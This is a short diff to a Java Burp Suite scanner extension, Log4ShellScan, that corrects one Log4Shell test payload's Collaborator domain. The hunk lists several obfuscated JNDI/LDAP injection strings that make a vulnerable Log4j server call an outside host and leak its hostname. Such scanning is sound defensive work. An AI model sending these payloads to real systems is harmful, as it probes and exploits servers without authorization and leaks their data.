@@ -42,7 +42,7 @@ public class Log4ShellScan implements IScannerCheck
             IBurpCollaboratorClientContext collab = this.callbacks.createBurpCollaboratorClientContext();
             String collabString = collab.generatePayload(true);
             ArrayList<String> payloads = new ArrayList<>();
-            payloads.add("${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}."+collabString+".net/a}");
+            payloads.add("${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}."+collabString+"/a}");
             payloads.add("${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1#${hostName}."+collabString+"/a}");
             payloads.add("${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}."+collabString+"/a}");
             payloads.add("${jndi:ldap://${hostName}." + collabString + ":80/a}");
